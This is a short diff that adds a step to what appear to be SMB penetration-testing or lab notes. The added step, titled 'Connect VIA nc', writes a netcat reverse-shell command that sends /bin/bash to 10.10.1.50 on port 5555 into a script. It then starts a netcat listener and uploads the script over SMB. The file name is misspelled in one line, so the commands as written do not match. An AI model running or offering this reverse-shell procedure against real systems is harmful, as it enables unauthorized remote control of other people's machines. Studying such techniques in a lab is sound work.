@@ -59,3 +59,17 @@
 
     cat smb.conf
 
+7. Connect VIA nc
+
+    A. Target Device
+
+          echo "nc -e /bin/bash 10.10.1.50 5555" > smbscipt.sh
+
+    B. Receiving Device
+
+          sudo nc -nvlp 5555
+
+    C. Target Device
+
+          put smbscript.sh
+
